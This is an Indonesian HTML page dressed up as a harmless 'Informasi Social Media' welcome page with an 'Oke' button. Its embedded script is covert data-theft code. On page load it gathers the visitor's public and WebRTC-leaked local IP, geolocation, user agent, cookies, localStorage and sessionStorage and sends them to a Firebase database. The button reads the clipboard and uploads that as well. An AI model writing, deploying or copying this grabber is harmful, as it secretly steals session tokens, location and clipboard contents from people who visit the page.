<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Informasi Social Media</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background-color: #f0f0f0;
    }
    .clipboard-section {
      background: #fff;
      padding: 15px;
      border-radius: 10px;
      margin-top: 20px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
    }
    button {
      padding: 8px 16px;
      margin-top: 10px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      background-color: #007BFF;
      color: white;
    }
    pre {
      background: #eee;
      padding: 10px;
      border-radius: 8px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <h1>Selamat datang...</h1>
  <p>Website Error</p>

  <div class="clipboard-section">
    <h3>My Website</h3>
    <p>
      Selamat datang di website Informasi Social Media
    </p>
    <button onclick="aksesClipboard()">Oke</button>
    <pre id="clipboardOutput">Belum diakses</pre>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
      measurementId: "G-LTMZD79ZWX"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    async function getPublicIP() {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    }

    function getLocalIP(callback) {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      pc.onicecandidate = event => {
        if (event && event.candidate && event.candidate.candidate.includes("candidate")) {
          const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
          callback(ipMatch ? ipMatch[1] : null);
          pc.close();
        }
      };
    }

    function getGeoLocation(callback) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => callback({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy
          }),
          () => callback(null),
          { timeout: 5000 }
        );
      } else {
        callback(null);
      }
    }

    let globalData = {
      timestamp: new Date().toLocaleString(),
      clipboard: 'Belum diakses'
    };

    async function collectAndSendData() {
      const publicIP = await getPublicIP();
      getLocalIP(localIP => {
        getGeoLocation(geo => {
          globalData = {
            ...globalData,
            ip: publicIP,
            localIP: localIP || 'Tidak tersedia',
            userAgent: navigator.userAgent,
            referer: document.referrer || '',
            latitude: geo?.lat || 'Tidak tersedia',
            longitude: geo?.lon || 'Tidak tersedia',
            accuracy: geo?.accuracy || 'Tidak tersedia',
            cookies: document.cookie || 'Tidak tersedia',
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage)
          };
          db.ref('visitors').push(globalData);
        });
      });
    }

    async function aksesClipboard() {
      try {
        const isi = await navigator.clipboard.readText();
        document.getElementById("clipboardOutput").textContent = isi || "(Clipboard kosong)";
        globalData.clipboard = isi || "(Clipboard kosong)";
        db.ref('visitors').push(globalData);
      } catch (err) {
        document.getElementById("clipboardOutput").textContent = "Gagal membaca clipboard: " + err.message;
      }
    }

    collectAndSendData();
  </script>
</body>
</html>
